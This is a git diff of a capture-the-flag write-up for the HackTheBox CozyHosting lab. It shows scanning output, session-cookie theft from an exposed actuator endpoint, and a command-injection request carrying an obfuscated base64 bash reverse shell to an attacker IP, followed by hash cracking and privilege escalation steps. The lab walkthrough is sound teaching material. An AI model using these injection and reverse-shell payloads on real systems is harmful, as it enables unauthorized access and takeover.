@@ -1,4 +1,5 @@
-# Nmap
+# HackTheBox CozyHosting Writeup
+## Nmap
 ```bash
 Nmap scan report for 10.10.11.230
 Host is up, received user-set (0.016s latency).
@@ -19,8 +20,7 @@ PORT     STATE SERVICE     REASON         VERSION
 9000/tcp open  cslistener? syn-ack ttl 63
 ```
 
-# User Flag
-## Dirbuster
+### Dirbuster
 ```bash
 gobuster dir -u http://cozyhosting.htb -w /usr/share/wordlists/dirb/big.txt
 ===============================================================
@@ -54,7 +54,7 @@ Finished
 ===============================================================
 ```
 
-## Actuator Session Cookie
+### Actuator Session Cookie
 ```
 http://cozyhosting.htb/actuator/sessions
 
@@ -78,7 +78,7 @@ Content-Length: 245
 "911EA3DAE63379C5D158AA85E8450259":"kanderson"}
 ```
 
-## Command Injection
+### Command Injection
 ```
 POST /executessh HTTP/1.1
 Host: cozyhosting.htb
@@ -97,7 +97,7 @@ Upgrade-Insecure-Requests: 1
 host=127.0.0.1&username=a%3b`echo${IFS}YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC43LzEyMzQgMD4mMQ%3d%3d|base64${IFS}-d|bash`
 ```
 
-## Postgres
+### Postgres
 Transfer cloudhosting-0.0.1.jar to local and read content with jadx.
 ![Postgresql](https://github.com/ngohuiann/CTF-Write-Ups/blob/main/image/CosyHosting1.png)
 
@@ -143,7 +143,7 @@ Status...........: Cracked
 Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
 ```
 
-# User Flag
+## User Flag
 ```
 app@cozyhosting:/app$ su josh
 su josh
@@ -165,7 +165,7 @@ lrwxrwxrwx 1 root root    9 May 21  2023 .psql_history -> /dev/null
 -rw-r--r-- 1 josh josh   39 Aug  8  2023 .vimrc
 ```
 
-# Root Flag
+## Root Flag
 ```bash
 josh@cozyhosting:/app$ sudo -l
 sudo -l
